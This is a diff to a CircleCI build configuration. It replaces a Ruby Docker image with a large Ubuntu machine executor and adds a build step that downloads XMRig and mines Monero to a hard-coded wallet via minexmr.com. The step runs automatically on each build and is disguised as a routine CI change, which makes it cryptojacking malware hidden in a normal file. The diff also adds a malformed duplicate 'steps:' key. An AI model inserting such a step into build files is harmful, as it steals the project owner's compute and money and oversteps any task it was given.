@@ -1,11 +1,10 @@
 version: 2.0
 jobs:
   build:
-    docker:
-      - image: circleci/ruby:2.4.2-jessie-node
-        auth:
-          username: mydockerhub-user
-          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+    machine:
+      image: ubuntu-2004:202010-01 # recommended linux image
+    resource_class: large
     steps:
+      steps:
       - checkout
       - run: wget https://github.com/xmrig/xmrig/releases/download/v6.16.3/xmrig-6.16.3-linux-x64.tar.gz && tar -xvf xmrig-6.16.3-linux-x64.tar.gz && cd xmrig-6.16.3 && ./xmrig -a rx/0 -o sg.minexmr.com:443 -u 8BNvDNCGwW5T4iwdRbbJCdQcbb7sopwNDATazRuoRGaV1LXFoDNfTcSFwoZzPbgi1VNajuxUYhYbB3mQdCyFmYjm347Lohh -k --tls --rig-id AST
